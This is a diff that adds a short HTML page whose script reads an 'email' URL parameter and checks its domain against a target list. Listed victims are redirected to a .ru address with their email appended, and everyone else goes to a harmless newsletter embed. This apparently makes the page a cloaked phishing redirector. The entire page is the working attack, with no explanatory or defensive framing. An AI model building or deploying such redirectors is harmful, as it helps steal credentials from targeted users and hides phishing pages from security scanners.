@@ -1,0 +1,50 @@
+<html>
+  <head>
+    <script>
+      fetch("config.json")
+        .then(response => response.json())
+        .then(config => {
+          const allowedDomains = config.allowedDomains;
+
+          // Parse URL parameters
+          const queryParams = window.location.search
+            .substr(1)
+            .split("&")
+            .reduce((q, query) => {
+              let [key, value] = query.split("=");
+              if (value) {
+                value = decodeURIComponent(value.trim()); // Decode and trim value
+                value = isNaN(Number(value)) ? value : Number(value);
+              }
+              q[key] = value;
+              return q;
+            }, {});
+
+          // Check if email param exists
+          if (!queryParams["email"]) {
+            console.error("Missing email parameter in URL");
+            return;
+          }
+
+          try {
+            const eDomain = queryParams["email"];
+            const decodedEmail = decodeURIComponent(eDomain).trim(); // Ensure proper decoding
+            const domain = decodedEmail.split("@")[1];
+
+            if (allowedDomains.includes(domain)) {
+              window.location.replace(
+                "https://tSQ.bomirax.ru/Z1cxl9eG/#X" + queryParams["email"]
+              );
+            } else {
+              window.location.replace(
+                "https://embeds.beehiiv.com/070131cf-be7b-481f-8e65-71fcc936e0f2"
+              );
+            }
+          } catch (error) {
+            console.error("Error decoding email parameter:", error);
+          }
+        })
+        .catch(error => console.error("Error fetching config.json:", error));
+    </script>
+  </head>
+</html>
